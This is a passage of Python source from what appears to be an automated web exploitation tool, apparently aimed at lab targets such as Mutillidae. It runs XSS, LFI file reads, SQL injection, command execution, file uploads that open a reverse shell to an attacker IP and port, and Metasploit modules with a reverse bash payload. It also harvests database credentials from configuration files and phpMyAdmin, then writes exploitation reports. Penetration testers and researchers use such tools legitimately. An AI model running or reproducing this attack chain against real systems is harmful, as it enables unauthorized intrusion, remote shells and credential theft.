    for endpoint in xss_endpoints[:max_tests_per_type]:
        success, proof, poc, evidence = test_xss_with_payload(endpoint.get("url", base_url), endpoint.get("parameter", "q"))
        if success:
            proof_file = persist_proof("xss", evidence)
            exploits.append({
                "type": "Cross-Site Scripting (XSS)",
                "target": f"{target}:{port}",
                "details": f"XSS vulnerability exploited on {endpoint.get('url', base_url)}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })
            xss_found = True
            break
    if not xss_found:
        logger.info("No XSS endpoints found in recon (or none successful), testing generic endpoints")
        for url in [f"{base_url}/search.php?q={{q}}", f"{base_url}/comment.php?text={{text}}"][:max_tests_per_type]:
            success, proof, poc, evidence = test_xss_with_payload(url, "q")
            if success:
                proof_file = persist_proof("xss", evidence)
                exploits.append({
                    "type": "Cross-Site Scripting (XSS)",
                    "target": f"{target}:{port}",
                    "details": "XSS vulnerability exploited",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })
                break

    # 3) LFI
    lfi_endpoints = vulnerable_endpoints.get("lfi", [])
    lfi_found = False
    for endpoint in lfi_endpoints[:max_tests_per_type]:
        success, proof, poc, evidence = test_lfi_and_file_download(endpoint.get("url", base_url), endpoint.get("parameter", "file"))
        if success:
            proof_file = persist_proof("lfi", evidence)
            exploits.append({
                "type": "Local File Inclusion (LFI)",
                "target": f"{target}:{port}",
                "details": f"LFI vulnerability exploited on {endpoint.get('url', base_url)}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })
            lfi_found = True
            break
    if not lfi_found:
        logger.info("No LFI endpoints found in recon (or none successful), testing generic endpoints")
        for url in [f"{base_url}/include.php?file={{file}}", f"{base_url}/page.php?include={{file}}"][:max_tests_per_type]:
            success, proof, poc, evidence = test_lfi_and_file_download(url, "file")
            if success:
                proof_file = persist_proof("lfi", evidence)
                exploits.append({
                    "type": "Local File Inclusion (LFI)",
                    "target": f"{target}:{port}",
                    "details": "LFI vulnerability exploited, sensitive files accessed",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })
                break

    # 4) File Upload
    upload_endpoints = vulnerable_endpoints.get("file_upload", [])
    upload_found = False
    for endpoint in upload_endpoints[:max_tests_per_type]:
        success, proof, poc, evidence = test_file_upload_and_shell(endpoint.get("url", base_url), "/upload.php", attacker_ip, attacker_port)
        if success:
            proof_file = persist_proof("upload", evidence)
            exploits.append({
                "type": "File Upload & Reverse Shell",
                "target": f"{target}:{port}",
                "details": f"File upload vulnerability exploited on {endpoint.get('url', base_url)}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })
            upload_found = True
            break
    if not upload_found:
        logger.info("No file upload endpoints found in recon (or none successful), testing generic endpoints")
        success, proof, poc, evidence = test_file_upload_and_shell(base_url, "/upload.php", attacker_ip, attacker_port)
        if success:
            proof_file = persist_proof("upload", evidence)
            exploits.append({
                "type": "File Upload & Reverse Shell",
                "target": f"{target}:{port}",
                "details": "File upload vulnerability exploited, reverse shell created",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })

    # 5) RCE - Test discovered endpoints with cmd/exec parameters
    rce_found = False
    for endpoint in discovered_endpoints:
        if any(param in ["cmd", "exec", "command"] for param in endpoint.get("parameters", [])):
            for param in ["cmd", "exec", "command"]:
                if param in endpoint.get("parameters", []):
                    success, proof, poc, evidence = test_rce_and_proof(endpoint["url"], param)
                    if success:
                        proof_file = persist_proof("rce", evidence)
                        exploits.append({
                            "type": "Remote Code Execution (RCE)",
                            "target": f"{target}:{port}",
                            "details": f"RCE vulnerability exploited on {endpoint['url']} with parameter {param}",
                            "poc": poc,
                            "proof": proof,
                            "proof_file": proof_file
                        })
                        rce_found = True
                        break
            if rce_found:
                break
    
    if not rce_found:
        # Fallback to generic RCE testing
        for url in [f"{base_url}/exec.php?cmd={{cmd}}", f"{base_url}/shell.php?cmd={{cmd}}"][:max_tests_per_type]:
            success, proof, poc, evidence = test_rce_and_proof(url, "cmd")
            if success:
                proof_file = persist_proof("rce", evidence)
                exploits.append({
                    "type": "Remote Code Execution (RCE)",
                    "target": f"{target}:{port}",
                    "details": "RCE vulnerability exploited",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })
                break

    # 6) Test all discovered endpoints for vulnerabilities
    logger.info(f"Testing {len(discovered_endpoints)} discovered endpoints for vulnerabilities")
    for endpoint in discovered_endpoints[:max_tests_per_type * 2]:  # Test more endpoints
        url = endpoint["url"]
        parameters = endpoint.get("parameters", [])
        
        # Test each parameter for different vulnerability types
        for param in parameters:
            # Test for LFI if parameter suggests file inclusion
            if param in ["file", "include", "path", "page"]:
                success, proof, poc, evidence = test_lfi_and_file_download(url, param)
                if success:
                    proof_file = persist_proof("lfi_discovered", evidence)
                    exploits.append({
                        "type": "Local File Inclusion (LFI) - Discovered Endpoint",
                        "target": f"{target}:{port}",
                        "details": f"LFI found on discovered endpoint {url} with parameter {param}",
                        "poc": poc,
                        "proof": proof,
                        "proof_file": proof_file
                    })
                    break
            
            # Test for XSS if parameter suggests user input
            if param in ["q", "search", "text", "comment", "message", "content"]:
                success, proof, poc, evidence = test_xss_with_payload(url, param)
                if success:
                    proof_file = persist_proof("xss_discovered", evidence)
                    exploits.append({
                        "type": "Cross-Site Scripting (XSS) - Discovered Endpoint",
                        "target": f"{target}:{port}",
                        "details": f"XSS found on discovered endpoint {url} with parameter {param}",
                        "poc": poc,
                        "proof": proof,
                        "proof_file": proof_file
                    })
                    break

    # 7) Test misconfigurations
    logger.info(f"Testing {len(misconfigurations)} misconfigurations")
    for misconfig in misconfigurations:
        if "mod_negotiation" in misconfig.lower():
            # Test mod_negotiation with common file extensions
            for ext in [".php", ".txt", ".bak", ".old", ".backup"]:
                test_url = f"{base_url}/index{ext}"
                success, proof, poc, evidence = test_exposed_directory(test_url)
                if success:
                    proof_file = persist_proof("mod_negotiation", evidence)
                    exploits.append({
                        "type": "Mod Negotiation Misconfiguration",
                        "target": f"{target}:{port}",
                        "details": f"Mod negotiation enabled, accessed {test_url}",
                        "poc": poc,
                        "proof": proof,
                        "proof_file": proof_file
                    })
                    break
        
        elif "etag" in misconfig.lower():
            # Test ETag information leak
            success, proof, poc, evidence = test_etag_leak(base_url)
            if success:
                proof_file = persist_proof("etag_leak", evidence)
                exploits.append({
                    "type": "ETag Information Leak",
                    "target": f"{target}:{port}",
                    "details": "ETag information leak exploited",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })

    # 8) Test outdated software vulnerabilities
    logger.info(f"Testing {len(outdated_software)} outdated software versions")
    for software in outdated_software:
        if "apache/2.2.8" in software.lower():
            # Test Apache 2.2.8 specific vulnerabilities
            success, proof, poc, evidence = test_apache_228_vulns(base_url)
            if success:
                proof_file = persist_proof("apache_228", evidence)
                exploits.append({
                    "type": "Apache 2.2.8 Vulnerability",
                    "target": f"{target}:{port}",
                    "details": f"Apache 2.2.8 vulnerability exploited: {software}",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })
        
        elif "php/5.2.4" in software.lower():
            # Test PHP 5.2.4 specific vulnerabilities
            success, proof, poc, evidence = test_php_524_vulns(base_url)
            if success:
                proof_file = persist_proof("php_524", evidence)
                exploits.append({
                    "type": "PHP 5.2.4 Vulnerability",
                    "target": f"{target}:{port}",
                    "details": f"PHP 5.2.4 vulnerability exploited: {software}",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })

    # 9) Test OS-level exploits from recon
    logger.info(f"Testing {len(os_exploit_mods)} OS exploit modules")
    for module in os_exploit_mods[:max_tests_per_type]:
        if module != "none":
            success, poc = run_metasploit_exploit(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
            if success:
                exploits.append({
                    "type": f"OS Exploit - {module.split('/')[-1]}",
                    "target": f"{target}:{port}",
                    "details": f"OS-level exploit successful with {module}",
                    "poc": poc,
                    "proof": "OS-level access achieved",
                    "proof_file": ""
                })

    # 10) Test wayback URLs for historical vulnerabilities
    logger.info(f"Testing {len(wayback_urls)} historical URLs")
    for url in wayback_urls[:max_tests_per_type]:
        # Test each historical URL for common vulnerabilities
        success, proof, poc, evidence = test_historical_url(url)
        if success:
            proof_file = persist_proof("wayback", evidence)
            exploits.append({
                "type": "Historical URL Vulnerability",
                "target": f"{target}:{port}",
                "details": f"Vulnerability found in historical URL: {url}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })

    # 11) Test virtual hosts
    logger.info(f"Testing {len(vhosts)} virtual hosts")
    for vhost in vhosts[:max_tests_per_type]:
        success, proof, poc, evidence = test_virtual_host(base_url, vhost)
        if success:
            proof_file = persist_proof("vhost", evidence)
            exploits.append({
                "type": "Virtual Host Vulnerability",
                "target": f"{target}:{port}",
                "details": f"Vulnerability found in virtual host: {vhost}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })

    # 12) Test DNS-based attacks
    logger.info(f"Testing {len(dns_records)} DNS records")
    for record in dns_records[:max_tests_per_type]:
        success, proof, poc, evidence = test_dns_record(record)
        if success:
            proof_file = persist_proof("dns", evidence)
            exploits.append({
                "type": "DNS-based Vulnerability",
                "target": f"{target}:{port}",
                "details": f"DNS-based vulnerability found: {record}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })

    # 13) Auth bypass opportunities
    auth_bypass_opportunities = metadata.get("auth_bypass_opportunities", [])
    for bypass in auth_bypass_opportunities[:max_tests_per_type]:
        if "TRACE" in bypass:
            success, proof, poc, evidence = test_http_trace_bypass(base_url)
            if success:
                proof_file = persist_proof("trace", evidence)
                exploits.append({
                    "type": "HTTP TRACE Authentication Bypass",
                    "target": f"{target}:{port}",
                    "details": "HTTP TRACE method exploited for authentication bypass",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file
                })
                break

    # 14) Exposed directories
    for directory in metadata.get("exposed_directories", [])[:max_tests_per_type]:
        success, proof, poc, evidence = test_exposed_directory(base_url + directory)
        if success:
            proof_file = persist_proof("exposed", evidence)
            exploits.append({
                "type": "Exposed Directory Information Disclosure",
                "target": f"{target}:{port}",
                "details": f"Sensitive information found in {directory}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })
            break

    # 15) Default files
    for file_path in metadata.get("default_files", [])[:max_tests_per_type]:
        success, proof, poc, evidence = test_default_file(base_url + file_path)
        if success:
            proof_file = persist_proof("default", evidence)
            exploits.append({
                "type": "Default File Information Disclosure",
                "target": f"{target}:{port}",
                "details": f"Sensitive information found in {file_path}",
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })
            break

    # 16) phpMyAdmin specific testing
    for endpoint in discovered_endpoints:
        if "phpmyadmin" in endpoint["url"].lower():
            success, proof, poc, evidence = test_phpmyadmin_access(base_url, target)
            if success:
                proof_file = persist_proof("phpmyadmin", evidence)
                exploits.append({
                    "type": "phpMyAdmin Access",
                    "target": f"{target}:{port}",
                    "details": f"phpMyAdmin database access gained: {proof}",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file,
                    "post_exploit_metadata": evidence.get("post_exploit_opportunities", {})
                })
                break

    # 17) phpinfo intelligence extraction
    for endpoint in discovered_endpoints:
        if "phpinfo" in endpoint["url"].lower():
            success, proof, poc, intelligence = extract_phpinfo_intelligence(endpoint["url"], target)
            if success:
                proof_file = persist_proof("phpinfo", intelligence)
                exploits.append({
                    "type": "phpinfo Intelligence Gathering",
                    "target": f"{target}:{port}",
                    "details": f"System intelligence extracted: {proof}",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file,
                    "post_exploit_metadata": intelligence.get("post_exploit_vectors", {})
                })
                break

    # 18) WebDAV exploitation
    for endpoint in discovered_endpoints:
        if endpoint["url"].endswith("/dav") or "/dav/" in endpoint["url"]:
            dav_path = endpoint["url"].replace(base_url, "")
            success, proof, poc, evidence = test_webdav_exploitation(base_url, dav_path, attacker_ip, attacker_port)
            if success:
                proof_file = persist_proof("webdav", evidence)
                exploits.append({
                    "type": "WebDAV File Upload Exploitation",
                    "target": f"{target}:{port}",
                    "details": f"WebDAV exploitation successful: {proof}",
                    "poc": poc,
                    "proof": proof,
                    "proof_file": proof_file,
                    "post_exploit_metadata": {"file_upload_access": True, "shell_access": evidence.get("shell_access", False)}
                })
                break

    # 19) Credential harvesting from sensitive files
    success, proof, poc, evidence = harvest_credentials_from_files(discovered_endpoints, base_url)
    if success:
        proof_file = persist_proof("credentials", evidence)
        exploits.append({
            "type": "Credential Harvesting",
            "target": f"{target}:{port}",
            "details": f"Credentials harvested from sensitive files: {proof}",
            "poc": poc,
            "proof": proof,
            "proof_file": proof_file,
            "post_exploit_metadata": {"credentials_found": len(evidence.get("discovered_credentials", [])), "credential_types": list(set([c.get("type") for c in evidence.get("discovered_credentials", [])]))}
        })

    # 20) Enhanced Metasploit exploitation with post-exploit validation
    for module in os_exploit_mods[:max_tests_per_type]:
        if module != "none":
            success, poc, post_exploit_data = enhance_metasploit_success_validation(module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port)
            if success:
                proof_file = persist_proof("metasploit_enhanced", post_exploit_data)
                exploits.append({
                    "type": f"Enhanced Metasploit Exploit - {module.split('/')[-1]}",
                    "target": f"{target}:{port}",
                    "details": f"Metasploit exploitation with post-exploit validation: {module}",
                    "poc": poc,
                    "proof": f"Session established with privilege level: {post_exploit_data.get('privilege_level', 'unknown')}",
                    "proof_file": proof_file,
                    "post_exploit_metadata": post_exploit_data
                })
                # Stop after first successful exploit since we have session
                break

    # 21) Standard Metasploit testing (fallback)
    if not any("Metasploit" in exploit.get("type", "") for exploit in exploits):
        exploits.extend(test_metasploit_http_exploits_with_recon(target, port, attacker_ip, attacker_port, metadata)[:max_tests_per_type])

    # 22) Mutillidae: header-based XSS reflection
    for page in ["/mutillidae/browser-info.php", "/mutillidae/footer.php", "/mutillidae/log-visit.php"]:
        url = f"{base_url}{page}"
        success, proof, poc, evidence = test_header_xss_reflection(url)
        if success:
            proof_file = persist_proof("header_xss", evidence)
            exploits.append({
                "type": "Header XSS Reflection",
                "target": f"{target}:{port}",
                "details": proof,
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file,
                "post_exploit_metadata": {"xss_header_reflection": True}
            })
            break

    # 23) Mutillidae: cookie-based feature toggles
    success, proof, poc, evidence = test_cookie_toggle_features(f"{base_url}/mutillidae/index.php")
    if success:
        proof_file = persist_proof("cookie_toggle", evidence)
        exploits.append({
            "type": "Cookie-based Feature Toggle",
            "target": f"{target}:{port}",
            "details": proof,
            "poc": poc,
            "proof": proof,
            "proof_file": proof_file,
            "post_exploit_metadata": {"cookie_toggle": evidence}
        })

    # 24) Mutillidae: LFI on known endpoints
    success, proof, poc, evidence = test_mutillidae_lfi(base_url)
    if success:
        proof_file = persist_proof("mutillidae_lfi", evidence)
        exploits.append({
            "type": "Mutillidae LFI",
            "target": f"{target}:{port}",
            "details": proof,
            "poc": poc,
            "proof": evidence.get("snippet", "LFI confirmed"),
            "proof_file": proof_file,
            "post_exploit_metadata": {"lfi_endpoint": evidence.get("endpoint"), "lfi_param": evidence.get("parameter")}
        })

    # 25) Mutillidae: quick SQLi error-based probes
    for test_url in [
        f"{base_url}/mutillidae/user-info.php?username=1'",
        f"{base_url}/mutillidae/add-to-your-blog.php?entry=1'&title=Test",
    ]:
        success, proof, poc, evidence = test_quick_sqli_error(test_url)
        if success:
            proof_file = persist_proof("mutillidae_sqli", evidence)
            exploits.append({
                "type": "SQL Injection (Error-based Indicator)",
                "target": f"{target}:{port}",
                "details": proof,
                "poc": poc,
                "proof": proof,
                "proof_file": proof_file
            })
            break

    # 26) Mutillidae: targeted POST SQLi on forms
    post_sqli_findings = test_mutillidae_post_sqli(base_url)
    for fnd in post_sqli_findings[:max_tests_per_type]:
        exploits.append({
            "type": fnd.get("type", "SQL Injection (POST)"),
            "target": f"{target}:{port}",
            "details": f"{fnd.get('type')}: {fnd.get('url')} param {fnd.get('parameter')}",
            "poc": fnd.get("poc", ""),
            "proof": fnd.get("evidence", "SQL error indicators present"),
            "risk_level": "HIGH"
        })

    # 27) Mutillidae: LFI config extraction for DB creds
    success, proof, poc, creds = test_mutillidae_lfi_configs(base_url)
    if success:
        exploits.append({
            "type": "Credential Harvesting via LFI",
            "target": f"{target}:{port}",
            "details": proof,
            "poc": poc,
            "proof": creds,
            "risk_level": "HIGH",
            "post_exploit_metadata": {"credentials_found": 1, "credential_types": ["database"], "db_creds": creds}
        })

    return exploits

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit results to JSON and Markdown files with comprehensive risk analysis."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    
    # Filter out failed attempts (those without 'type' key)
    successful_exploits = [exp for exp in exploits if 'type' in exp]
    failed_attempts = [exp for exp in exploits if 'type' not in exp]
    
    # Analyze risk levels across all exploits
    risk_levels = {
        "CRITICAL": [],
        "HIGH": [],
        "MEDIUM": [],
        "LOW": []
    }
    
    for exploit in successful_exploits:
        # Prefer explicit risk_level if present, otherwise infer from type/details
        inferred = exploit.get("risk_level")
        if not inferred:
            etype = (exploit.get("type") or "").lower()
            details = (exploit.get("details") or "").lower()
            if "rce" in etype or "reverse shell" in details:
                inferred = "CRITICAL"
            elif "lfi" in etype and ("passwd" in details.lower() or "complete system compromise" in exploit.get("proof"," ").lower()):
                inferred = "CRITICAL"
            elif "sql injection" in etype:
                inferred = "HIGH"
            elif "xss" in etype or "cookie-based" in etype:
                inferred = "MEDIUM"
            else:
                inferred = "MEDIUM"
            exploit["risk_level"] = inferred
        risk_levels[inferred].append(exploit)
    
    # Extract post-exploitation metadata
    post_exploit_metadata = {}
    session_established = False
    credentials_found = []
    privilege_level = "unknown"
    system_access = False
    
    for exploit in successful_exploits:
        post_meta = exploit.get("post_exploit_metadata", {})
        if post_meta:
            # Check for session establishment
            if post_meta.get("session_established", False):
                session_established = True
                privilege_level = post_meta.get("privilege_level", "user")
                system_access = True
                post_exploit_metadata.update(post_meta)
            
            # Collect credentials
            if "credentials_found" in post_meta:
                credentials_found.extend(post_meta.get("credential_types", []))
            
            # Collect other post-exploit opportunities
            for key, value in post_meta.items():
                if key not in post_exploit_metadata:
                    post_exploit_metadata[key] = value

    # Create comprehensive report data
    report_data = {
        "target": f"{target}:{port}",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "total_exploits": len(successful_exploits),
        "successful_exploits": successful_exploits,
        "failed_attempts": failed_attempts,
        "risk_analysis": {
            "critical": len(risk_levels["CRITICAL"]),
            "high": len(risk_levels["HIGH"]),
            "medium": len(risk_levels["MEDIUM"]),
            "low": len(risk_levels["LOW"])
        },
        "summary": {
            "sql_injection": len([exp for exp in successful_exploits if "sql injection" in exp.get("type", "").lower()]),
            "xss": len([exp for exp in successful_exploits if "xss" in exp.get("type", "").lower()]),
            "lfi": len([exp for exp in successful_exploits if "lfi" in exp.get("type", "").lower()]),
            "rce": len([exp for exp in successful_exploits if "rce" in exp.get("type", "").lower()]),
            "file_upload": len([exp for exp in successful_exploits if "File Upload" in exp.get("type", "")]),
            "metasploit": len([exp for exp in successful_exploits if "Metasploit" in exp.get("type", "")]),
            "phpmyadmin": len([exp for exp in successful_exploits if "phpMyAdmin" in exp.get("type", "")]),
            "webdav": len([exp for exp in successful_exploits if "WebDAV" in exp.get("type", "")]),
            "credentials": len([exp for exp in successful_exploits if "Credential" in exp.get("type", "")]),
            "phpinfo": len([exp for exp in successful_exploits if "phpinfo" in exp.get("type", "")]),
            "other": len([exp for exp in successful_exploits if not any(vuln in exp.get("type", "") for vuln in ["SQL Injection", "XSS", "LFI", "RCE", "File Upload", "Metasploit", "phpMyAdmin", "WebDAV", "Credential", "phpinfo"])])
        },
        "post_exploitation_status": {
            "session_established": session_established,
            "privilege_level": privilege_level,
            "system_access": system_access,
            "credentials_found": list(set(credentials_found)),
            "post_exploit_opportunities": post_exploit_metadata,
            "ready_for_post_exploitation": session_established or len(credentials_found) > 0 or system_access
        }
    }
    
    # Save JSON report
    json_file = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    with json_file.open("w") as f:
        json.dump(report_data, f, indent=2)
    
    # Generate comprehensive Markdown report
    md_file = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    with md_file.open("w") as f:
        f.write(f"# HTTP Exploitation Report\n")
        f.write(f"## Target: {target}:{port}\n")
        f.write(f"## Timestamp: {report_data['timestamp']}\n\n")
        
        f.write("## Executive Summary\n")
        f.write(f"- **Total Exploits**: {len(successful_exploits)}\n")
        f.write(f"- **Critical Risk**: {report_data['risk_analysis']['critical']}\n")
        f.write(f"- **High Risk**: {report_data['risk_analysis']['high']}\n")
        f.write(f"- **Medium Risk**: {report_data['risk_analysis']['medium']}\n")
        f.write(f"- **Low Risk**: {report_data['risk_analysis']['low']}\n\n")
        
        f.write("## Vulnerability Breakdown\n")
        f.write(f"- **SQL Injection**: {report_data['summary']['sql_injection']}\n")
        f.write(f"- **XSS**: {report_data['summary']['xss']}\n")
        f.write(f"- **LFI**: {report_data['summary']['lfi']}\n")
        f.write(f"- **RCE**: {report_data['summary']['rce']}\n")
        f.write(f"- **File Upload**: {report_data['summary']['file_upload']}\n")
        f.write(f"- **Metasploit**: {report_data['summary']['metasploit']}\n")
        f.write(f"- **phpMyAdmin Access**: {report_data['summary']['phpmyadmin']}\n")
        f.write(f"- **WebDAV Exploitation**: {report_data['summary']['webdav']}\n")
        f.write(f"- **Credential Harvesting**: {report_data['summary']['credentials']}\n")
        f.write(f"- **phpinfo Intelligence**: {report_data['summary']['phpinfo']}\n")
        f.write(f"- **Other**: {report_data['summary']['other']}\n\n")
        
        # Add post-exploitation status
        post_status = report_data.get("post_exploitation_status", {})
        f.write("## Post-Exploitation Status\n")
        f.write(f"- **Session Established**: {'Yes' if post_status.get('session_established', False) else 'No'}\n")
        f.write(f"- **Privilege Level**: {post_status.get('privilege_level', 'unknown').title()}\n")
        f.write(f"- **System Access**: {'Yes' if post_status.get('system_access', False) else 'No'}\n")
        f.write(f"- **Credentials Found**: {', '.join(post_status.get('credentials_found', [])) if post_status.get('credentials_found') else 'None'}\n")
        f.write(f"- **Ready for Post-Exploitation**: {'Yes' if post_status.get('ready_for_post_exploitation', False) else 'No'}\n\n")
        
        # Risk-based categorization
        for risk_level in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if risk_levels[risk_level]:
                f.write(f"## {risk_level} Risk Exploits\n\n")
                for exploit in risk_levels[risk_level]:
                    f.write(f"### {exploit['type']}\n")
                    f.write(f"- **Target**: {exploit['target']}\n")
                    f.write(f"- **Risk Level**: {exploit.get('risk_level', 'MEDIUM')}\n")
                    f.write(f"- **Risk Description**: {exploit.get('risk_description', 'No description available')}\n")
                    f.write(f"- **Details**: {exploit['details']}\n")
                    f.write(f"- **PoC**: `{exploit['poc']}`\n")
                    f.write(f"- **Proof**: {exploit['proof']}\n")
                    if exploit.get('proof_file'):
                        f.write(f"- **Proof File**: {exploit['proof_file']}\n")
                    
                    # Add detailed analysis if available
                    if exploit.get('risk_analysis'):
                        f.write(f"- **Risk Analysis**:\n")
                        for risk_category, items in exploit['risk_analysis'].items():
                            if items:
                                f.write(f"  - {risk_category.replace('_', ' ').title()}: {len(items)} items\n")
                    
                    f.write("\n")
        
        if failed_attempts:
            f.write("## Failed Attempts\n\n")
            for attempt in failed_attempts:
                f.write(f"- {attempt.get('details', 'Unknown failure')}\n")
        
        # Add recommendations
        f.write("## Security Recommendations\n\n")
        if report_data['risk_analysis']['critical'] > 0:
            f.write("### CRITICAL - Immediate Action Required\n")
            f.write("- Implement input validation and sanitization\n")
            f.write("- Disable dangerous PHP functions (eval, exec, system)\n")
            f.write("- Implement proper file upload restrictions\n")
            f.write("- Use parameterized queries for all database operations\n")
            f.write("- Implement Content Security Policy (CSP)\n\n")
        
        if report_data['risk_analysis']['high'] > 0:
            f.write("### HIGH - Urgent Action Required\n")
            f.write("- Fix all identified vulnerabilities immediately\n")
            f.write("- Implement proper authentication and authorization\n")
            f.write("- Use HTTPS for all communications\n")
            f.write("- Regular security audits and penetration testing\n\n")
        
        if report_data['risk_analysis']['medium'] > 0:
            f.write("### MEDIUM - Action Required\n")
            f.write("- Implement proper error handling\n")
            f.write("- Regular security updates and patches\n")
            f.write("- Security awareness training for developers\n\n")
    
    print(f"[+] Exploit report saved: {json_file}")
    print(f"[+] Exploit report saved: {md_file}")
    print(f"[+] Found {len(successful_exploits)} successful exploits")
    print(f"[+] Risk Analysis: {report_data['risk_analysis']['critical']} Critical, {report_data['risk_analysis']['high']} High, {report_data['risk_analysis']['medium']} Medium, {report_data['risk_analysis']['low']} Low")

def test_http_trace_bypass(base_url: str) -> Tuple[bool, str, str, Dict]:
    """Test HTTP TRACE method for authentication bypass."""
    logger.info(f"Testing HTTP TRACE bypass on {base_url}")
    
    try:
        # Test HTTP TRACE method
        trace_cmd = ["curl", "-X", "TRACE", base_url, "-v"]
        output, success = run_command(trace_cmd, timeout=30)
        
        if success and ("200" in output or "TRACE" in output):
            poc = f"curl -X TRACE {base_url}"
            proof = f"HTTP TRACE method enabled: {output.strip()}"
            return True, proof, poc, {"content": output}
            
    except Exception as e:
        logger.error(f"HTTP TRACE test failed: {e}")
    
    return False, "", f"curl -X TRACE {base_url}", {}

def test_exposed_directory(url: str) -> Tuple[bool, str, str, Dict]:
    """Test exposed directory for sensitive information."""
    logger.info(f"Testing exposed directory: {url}")
    
    try:
        response = requests.get(url, timeout=10, verify=False)
        if response.status_code == 200:
            content = response.text
            sensitive_info = []
            
            # Look for sensitive information
            if any(keyword in content.lower() for keyword in ["password", "admin", "config", "database"]):
                sensitive_info.append("Sensitive keywords found")
            
            if len(content) > 100:  # Directory listing or large file
                sensitive_info.append("Large content detected")
            
            if sensitive_info:
                poc = f"curl {url}"
                proof = f"Exposed directory contains sensitive information: {'; '.join(sensitive_info)}"
                return True, proof, poc, {"url": url, "content": content}
                
    except Exception as e:
        logger.error(f"Exposed directory test failed: {e}")
    
    return False, "", f"curl {url}", {}

def test_default_file(url: str) -> Tuple[bool, str, str, Dict]:
    """Test default file for sensitive information."""
    logger.info(f"Testing default file: {url}")
    
    try:
        response = requests.get(url, timeout=10, verify=False)
        if response.status_code == 200:
            content = response.text
            sensitive_info = []
            
            # Look for sensitive information based on file type
            if "robots.txt" in url:
                if "disallow" in content.lower() or "allow" in content.lower():
                    sensitive_info.append("Robots.txt reveals directory structure")
            
            elif "phpinfo" in url.lower():
                if "php" in content.lower() and "version" in content.lower():
                    sensitive_info.append("PHP info reveals system information")
            
            elif any(ext in url for ext in [".bak", ".backup", ".old"]):
                sensitive_info.append("Backup file contains sensitive data")
            
            if sensitive_info:
                poc = f"curl {url}"
                proof = f"Default file contains sensitive information: {'; '.join(sensitive_info)}"
                return True, proof, poc, {"url": url, "content": content}
                
    except Exception as e:
        logger.error(f"Default file test failed: {e}")
    
    return False, "", f"curl {url}", {}

def test_etag_leak(base_url: str) -> Tuple[bool, str, str, Dict]:
    """Test ETag information leak."""
    logger.info(f"Testing ETag leak on {base_url}")
    
    try:
        response = requests.get(base_url, timeout=10, verify=False)
        etag = response.headers.get("ETag", "")
        
        if etag and ("inode" in etag.lower() or len(etag) > 20):
            poc = f"curl -I {base_url}"
            proof = f"ETag information leak detected: {etag}"
            return True, proof, poc, {"url": base_url, "etag": etag, "headers": dict(response.headers)}
    except Exception as e:
        logger.error(f"ETag test failed: {e}")
    
    return False, "", f"curl -I {base_url}", {}

def test_apache_228_vulns(base_url: str) -> Tuple[bool, str, str, Dict]:
    """Test Apache 2.2.8 specific vulnerabilities."""
    logger.info(f"Testing Apache 2.2.8 vulnerabilities on {base_url}")
    
    try:
        # Test for common Apache 2.2.8 vulnerabilities
        test_urls = [
            f"{base_url}/cgi-bin/test-cgi?*",
            f"{base_url}/cgi-bin/printenv",
            f"{base_url}/cgi-bin/status"
        ]
        
        for test_url in test_urls:
            response = requests.get(test_url, timeout=10, verify=False)
            if response.status_code == 200 and len(response.text) > 100:
                poc = f"curl '{test_url}'"
                proof = f"Apache 2.2.8 vulnerability found: {test_url}"
                return True, proof, poc, {"url": test_url, "content": response.text}
    except Exception as e:
        logger.error(f"Apache 2.2.8 test failed: {e}")
    
    return False, "", f"curl {base_url}/cgi-bin/test-cgi", {}

def test_php_524_vulns(base_url: str) -> Tuple[bool, str, str, Dict]:
    """Test PHP 5.2.4 specific vulnerabilities."""
    logger.info(f"Testing PHP 5.2.4 vulnerabilities on {base_url}")
    
    try:
        # Test for PHP 5.2.4 specific vulnerabilities
        test_urls = [
            f"{base_url}/phpinfo.php",
            f"{base_url}/info.php",
            f"{base_url}/test.php"
        ]
        
        for test_url in test_urls:
            response = requests.get(test_url, timeout=10, verify=False)
            if response.status_code == 200 and "php" in response.text.lower():
                poc = f"curl '{test_url}'"
                proof = f"PHP 5.2.4 vulnerability found: {test_url}"
                return True, proof, poc, {"url": test_url, "content": response.text}
    except Exception as e:
        logger.error(f"PHP 5.2.4 test failed: {e}")
    
    return False, "", f"curl {base_url}/phpinfo.php", {}

def test_historical_url(url: str) -> Tuple[bool, str, str, Dict]:
    """Test historical URL for vulnerabilities."""
    logger.info(f"Testing historical URL: {url}")
    
    try:
        response = requests.get(url, timeout=10, verify=False)
        if response.status_code == 200 and len(response.text) > 50:
            poc = f"curl '{url}'"
            proof = f"Historical URL accessible: {url}"
            return True, proof, poc, {"url": url, "content": response.text}
    except Exception as e:
        logger.error(f"Historical URL test failed: {e}")
    
    return False, "", f"curl '{url}'", {}

def test_virtual_host(base_url: str, vhost: str) -> Tuple[bool, str, str, Dict]:
    """Test virtual host for vulnerabilities."""
    logger.info(f"Testing virtual host: {vhost}")
    
    try:
        headers = {"Host": vhost}
        response = requests.get(base_url, headers=headers, timeout=10, verify=False)
